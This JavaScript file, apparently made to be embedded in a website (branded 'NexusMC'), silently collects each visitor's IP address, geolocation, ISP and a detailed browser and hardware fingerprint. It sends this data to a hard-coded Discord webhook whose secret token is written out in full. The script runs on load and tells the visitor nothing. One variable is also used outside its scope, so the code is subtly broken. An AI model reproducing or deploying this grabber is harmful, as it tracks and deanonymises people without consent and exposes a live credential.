// Discord webhook URL
const discordWebhookUrl = 'https://discord.com/api/webhooks/1347543398852067338/aFiJDuXLL3SL99nlblHe3kgJeOFgG_R1mEim-_zmilo7QC7hDCtqNJIQYzH-1UVUUDG7';

// Function to send data to the Discord webhook
function sendToDiscord(data) {
  fetch(discordWebhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      username: 'NexusMC Info',
      avatar_url: 'https://nexusmc.fun/Images/nexus_mc_rdx_logo.png',
      embeds: [
        {
          title: 'User Info',
          color: 0xFFC107,
          fields: Object.entries(data).map(([key, value]) => ({
            name: key,
            value: value.toString(),
          })),
        },
      ],
    }),
  })
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
    })
    .catch(error => {
      console.error('Error sending data to Discord:', error);
    });
}

// Function to collect user information
async function collectUserInfo() {
  let userInfo = {};

  try {
    // Collect IP address information using wtfismyip.com API
    const my_ip = await (await fetch("https://wtfismyip.com/json")).json();
    const ip_data = await (await fetch(`https://uncors.vercel.app/?url=http://ip-api.com/json/${my_ip.YourFuckingIPAddress}`)).json();

    if (my_ip && ip_data) {
      userInfo['IP Address'] = ip_data.query;
      userInfo['Hostname'] = my_ip.YourFuckingHostname;
      userInfo['Country'] = `${ip_data.country} (${ip_data.countryCode})`;
      userInfo['Region'] = `${ip_data.regionName} (${ip_data.region})`;
      userInfo['City'] = ip_data.city;
      userInfo['Latitude'] = ip_data.lat;
      userInfo['Longitude'] = ip_data.lon;
      userInfo['ISP'] = my_ip.YourFuckingISP;
      userInfo['Autonomous System'] = ip_data.as;
    } else {
      userInfo['IP Address'] = '::ffff:172.70.126.134';
    }
  } catch (error) {
    console.error('Error collecting IP address information:', error);
  }

  // Collect other user information
  userInfo['User Agent'] = navigator.userAgent;
  userInfo['Connection Method'] = "GET";
  userInfo['Request URL'] = "/";
  userInfo['Request Path'] = "/";
  userInfo['Request Protocol'] = "http";
  userInfo['Secure Connection'] = false ? 'Yes' : 'No';
  userInfo['Proxy IPs'] = '[]';
  userInfo['Window Properies'] = Object.keys(window).length;
  userInfo['Window Width'] = `${window.innerWidth} px`;
  userInfo['Window Height'] = `${window.innerHeight} px`;
  userInfo['Window Ratio'] = `${window.innerWidth / window.innerHeight}/1`;
  userInfo['Screen Width'] = `${window.screen.availWidth} px`;
  userInfo['Screen Height'] = `${window.screen.availHeight} px`;
  userInfo['Screen Ratio'] = `${window.screen.availWidth / window.screen.availHeight}/1`;
  userInfo['Screen Pixel Ratio'] = window.devicePixelRatio;
  userInfo['Screen DPI'] = window.devicePixelRatio;
  userInfo['Screen Color Depth'] = window.screen.colorDepth;
  userInfo['Screen Orientation'] = `${window.screen.orientation.type} (${window.screen.orientation.angle}°)`;
  userInfo['Screen Rotation'] = window.screen.orientation.angle;
  userInfo['OS'] = `${navigator.platform}`;
  userInfo['Available Browser Memory'] = typeof window.performance.memory != 'undefined' ? `${Math.round(window.performance.memory.jsHeapSizeLimit / 1024 / 1024)} MB` : null;
  userInfo['CPU Threads'] = `${navigator.hardwareConcurrency}`;

  let gl;
  let debugInfo;
  try {
    const canvas = document.createElement('canvas');
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
  } catch (e) {}
  if (gl && debugInfo) {
    userInfo['GPU Vendor'] = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    userInfo['GPU Info'] = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  }

  userInfo['Device Memory'] = `${navigator.deviceMemory}`;
  userInfo['System Languages'] = navigator.languages.join(', ');
  userInfo['Language'] = `${navigator.language}`;
  let date = new Date();
  userInfo['Current Time'] = `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`;
  if (ip_data) userInfo['Timezone'] = ip_data.timezone;

  // Send collected data to Discord webhook
  sendToDiscord(userInfo);
}

// Call the function to collect user information
collectUserInfo();
